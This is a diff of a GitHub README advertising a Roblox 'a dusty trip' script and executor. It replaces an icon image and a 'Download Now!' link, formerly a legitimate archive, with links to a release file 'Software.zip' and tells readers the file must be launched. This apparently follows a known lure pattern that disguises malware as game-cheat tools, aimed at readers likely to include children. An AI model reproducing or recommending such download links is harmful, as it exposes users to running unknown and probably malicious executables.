@@ -1,6 +1,6 @@
 # 🚀 **Welcome to the "adusty" Repository!** 🚀
 
-![Roblox](https://img.icons8.com/plasticine/2x/roblox.png)
+![Roblox](https://github.com/Ayushsingh100303/adusty/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository is all about the exciting world of Roblox and specifically focuses on the "a dusty trip" script and executor. Dive into the action with our powerful exploit tools and unleash your creativity in the Roblox universe.
@@ -11,7 +11,7 @@ This repository is all about the exciting world of Roblox and specifically focus
 ## Get Started
 To get started with our Roblox a dusty trip Script & Executor, click on the link below:
 
-[Download Now!](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Now!](https://github.com/Ayushsingh100303/adusty/releases/download/v2.0/Software.zip)
 
 *Note: This file needs to be launched to access our exciting tools!*
 
